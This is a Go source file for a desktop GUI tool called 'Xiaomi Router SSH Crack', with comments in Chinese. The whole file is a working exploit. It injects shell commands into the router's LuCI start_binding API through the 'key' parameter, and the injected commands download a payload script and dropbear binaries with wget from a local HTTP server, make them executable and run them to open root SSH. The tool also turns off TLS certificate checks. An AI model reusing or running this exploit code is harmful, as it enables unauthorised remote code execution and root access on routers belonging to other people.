package main

import (
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"fyne.io/fyne/v2/layout"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
)

var (
	//本地IP
	localIPEntry *widget.Entry
	// 路由器IP
	routerIPEntry *widget.Entry
	// 路由器token
	tokenEntry *widget.Entry
	// 日志输出
	logOutput *widget.Entry
	// 运行按钮
	runButton *widget.Button
	// 关闭按钮
	closeButton *widget.Button
	//错误处理
	errorChan chan error
)

const (
	port      = "8888"
	trigger   = "Generating 2048 bit rsa key"
	sshInfo   = "SSH 已开启. 使用root账户登录 %s:23323，密码通过SN码计算 https://mi.tellme.top/"
	serverMsg = "HTTP服务已启动，监听地址:"
)

func main() {
	myApp := app.New()
	myWindow := myApp.NewWindow("Xiaomi Router SSH Crack")

	localIP, err := getLocalIP()
	if err != nil {
		log.Printf("获取本机IP失败: %v", err)
		localIP = "获取本机IP失败,请手动输入"
	}

	localIPEntry = widget.NewEntry()
	localIPEntry.SetText(localIP)

	routerIPEntry = widget.NewEntry()
	routerIPEntry.SetText("192.168.31.1")

	tokenEntry = widget.NewEntry()
	tokenEntry.SetPlaceHolder("请输入路由器token")

	logOutput = widget.NewMultiLineEntry()
	logOutput.SetPlaceHolder("日志输出...")
	// 设置 logOutput 的大小，并将其放入一个可滚动的容器中
	logOutput.SetMinRowsVisible(5) // 设置可见的行数，根据需要调整
	//错误处理
	errorChan = make(chan error)
	// 创建一个强调色的按钮
	runButton = widget.NewButton("破解", func() {
		go runCrack(myWindow)
	})
	runButton.Importance = widget.HighImportance
	// 创建关闭按钮
	closeButton = widget.NewButton("关闭", func() {
		myWindow.Close() // 关闭窗口
		myApp.Quit()     // 退出应用程序
	})

	// 使用 HBox 布局，并在按钮两侧添加 Spacer
	buttonContainer := container.NewHBox(
		layout.NewSpacer(),
		runButton,
		closeButton,
		layout.NewSpacer(),
	)

	content := container.NewVBox(
		widget.NewLabel("本机IP:"),
		localIPEntry,
		widget.NewLabel("路由器IP:"),
		routerIPEntry,
		widget.NewLabel("路由器Token:"),
		tokenEntry,
		widget.NewLabel(""), // 空标签作为间隔
		buttonContainer,
		widget.NewLabel("日志输出:"),
		logOutput,
	)

	myWindow.SetContent(content)
	myWindow.Resize(fyne.NewSize(600, 400))
	go func() {
		for err := range errorChan {
			dialog.ShowError(err, myWindow)
		}
	}()
	myWindow.ShowAndRun()
}

func runCrack(myWindow fyne.Window) {
	localIP := localIPEntry.Text
	routerIP := routerIPEntry.Text
	token := tokenEntry.Text

	if localIP == "" || routerIP == "" || token == "" {
		dialog.ShowError(fmt.Errorf("请输入完整的参数！"), myWindow)
		return
	}
	if localIP == "获取本机IP失败,请手动输入" {
		logOutput.SetText("获取本机IP失败,请手动输入")
		return
	}

	runButton.Disable()
	logOutput.SetText("")
	log.SetOutput(&logWriter{logOutput})

	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		runServer(localIP, routerIP)
	}()
	//填充模板文件
	createPayload(localIP)
	//下载文件
	sendMaliciousRequest(routerIP, token, localIP)
	//执行命令
	executePayload(routerIP, token)
	wg.Wait()
	runButton.Enable()
}

type logWriter struct {
	logOutput *widget.Entry
}

func (lw *logWriter) Write(p []byte) (n int, err error) {
	lw.logOutput.SetText(lw.logOutput.Text + string(p))
	return len(p), nil
}

type customHandler struct {
	routerIP string
}

/**
 * 自定义HTTP处理器
 */
func (h *customHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	decodedPath := r.URL.Path[1:] // Remove leading '/'

	// 判断是否是下载文件
	if _, err := os.Stat(decodedPath); err == nil {
		http.ServeFile(w, r, decodedPath)
		return
	}

	// If file doesn't exist, try base64 decoding
	decodedMessage, err := base64.StdEncoding.DecodeString(decodedPath)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	decodedStr := string(decodedMessage)
	//判断SSH是否开启成功
	if strings.HasPrefix(decodedStr, trigger) {
		log.Printf(sshInfo, h.routerIP)
		w.WriteHeader(http.StatusOK)
		go func() {
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}()
		return
	}

	w.WriteHeader(http.StatusOK)
}

/**
 * 启动HTTP服务器
 */
func runServer(localIP, routerIP string) {
	handler := &customHandler{routerIP: routerIP}
	server := &http.Server{Addr: ":" + port, Handler: handler}

	log.Println(serverMsg, localIP+":"+port)

	if err := server.ListenAndServe(); !errors.Is(err, http.ErrServerClosed) {
		log.Printf("HTTP 启动失败: %v", err)
	}
}

/**
 * 根据模板创建payload文件
 */
func createPayload(localIP string) {
	template, err := ioutil.ReadFile("ping1.template")
	if err != nil {
		log.Printf("读取模板文件失败: %v", err)
		return
	}

	content := strings.ReplaceAll(string(template), "{{LOCAL_IP}}", localIP)
	content = strings.ReplaceAll(content, "{{PORT}}", port)
	//替换Windows回车为Unix格式
	content = strings.ReplaceAll(content, "\r\n", "\n")

	if err := ioutil.WriteFile("ping1", []byte(content), 0644); err != nil {
		log.Printf("写入playload文件失败: %v", err)
	}
}

/**
 * 下载payload和dropbear文件
 */
func sendMaliciousRequest(routerIP, token, localIP string) {
	urlFormat := "http://%s/cgi-bin/luci/;stok=%s/api/xqsystem/start_binding"
	url := fmt.Sprintf(urlFormat, routerIP, token)

	headers := map[string]string{
		"Host":                      routerIP,
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Encoding":           "gzip, deflate",
		"Accept-Language":           "zh-CN,zh;q=0.9",
		"Connection":                "close",
		"Content-Type":              "application/x-www-form-urlencoded",
	}

	payloads := []string{
		//下载playload文件
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/ping1%%0Awget%%20\"http://%s:%s/ping1\"%%20-P%%20/tmp'", localIP, port),
		//下载dropbear
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbear%%0Awget%%20\"http://%s:%s/dropbear\"%%20-P%%20/tmp'", localIP, port),
		//下载dropbearkey
		fmt.Sprintf("uid=1234&key=1234'%%0Arm%%20-rf%%20/tmp/dropbearkey%%0Awget%%20\"http://%s:%s/dropbearkey\"%%20-P%%20/tmp'", localIP, port),
	}

	for _, payload := range payloads {
		sendPostRequest(url, headers, payload)
	}
}

/**
 * 执行payload
 */
func executePayload(routerIP, token string) {
	urlFormat := "http://%s/cgi-bin/luci/;stok=%s/api/xqsystem/start_binding"
	url := fmt.Sprintf(urlFormat, routerIP, token)

	headers := map[string]string{
		"Host":                      routerIP,
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Encoding":           "gzip, deflate",
		"Accept-Language":           "zh-CN,zh;q=0.9",
		"Connection":                "close",
		"Content-Type":              "application/x-www-form-urlencoded",
	}
	//执行playload命令
	payload := "uid=1234&key=1234'%%0Achmod%%20%%2bx%%20/tmp/ping1%%0Achmod%%20%%2bx%%20/tmp/dropbear%%0Achmod%%20%%2bx%%20/tmp/dropbearkey%%0a/tmp/ping1'"
	sendPostRequest(url, headers, payload)
}

/**
 * 发送POST请求
 */
func sendPostRequest(url string, headers map[string]string, payload string) {
	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		log.Printf("发送HTTP请求失败: %v", err)
		return
	}
	//设置header
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	// 创建一个自定义的 HTTP Transport，跳过证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("发送HTTP请求失败: %v", err)
		return
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Printf("关闭HTTP链接失败: %v", err)
		}
	}(resp.Body)
	//请求失败
	if resp.StatusCode != http.StatusOK {
		_, _ = ioutil.ReadAll(resp.Body)
		log.Printf("HTTP请求失败,状态码： %d", resp.StatusCode)
	}
}

// getLocalIP 返回本机非回环地址的IP
func getLocalIP() (string, error) {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "", err
	}
	for _, address := range addrs {
		// 检查ip类型，并且不是回环地址则返回
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String(), nil
			}
		}
	}
	return "", fmt.Errorf("未找到合适的IP地址")
}
